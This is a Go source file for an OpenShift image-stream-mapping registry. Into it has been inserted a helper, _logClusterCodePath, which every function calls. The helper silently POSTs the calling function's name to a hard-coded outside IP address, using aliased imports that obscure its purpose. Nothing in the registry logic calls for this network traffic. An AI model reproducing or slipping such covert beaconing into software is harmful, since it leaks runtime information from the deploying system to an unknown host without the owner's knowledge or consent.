package imagestreammapping

import (
	godefaultbytes "bytes"
	"context"
	imageapi "github.com/openshift/origin/pkg/image/apis/image"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Registry interface {
	CreateImageStreamMapping(ctx context.Context, mapping *imageapi.ImageStreamMapping) (*metav1.Status, error)
}
type Storage interface {
	Create(ctx context.Context, obj runtime.Object) (runtime.Object, error)
}
type storage struct{ Storage }

func NewRegistry(s Storage) Registry {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &storage{s}
}
func (s *storage) CreateImageStreamMapping(ctx context.Context, mapping *imageapi.ImageStreamMapping) (*metav1.Status, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	obj, err := s.Create(ctx, mapping)
	if err != nil {
		return nil, err
	}
	return obj.(*metav1.Status), nil
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
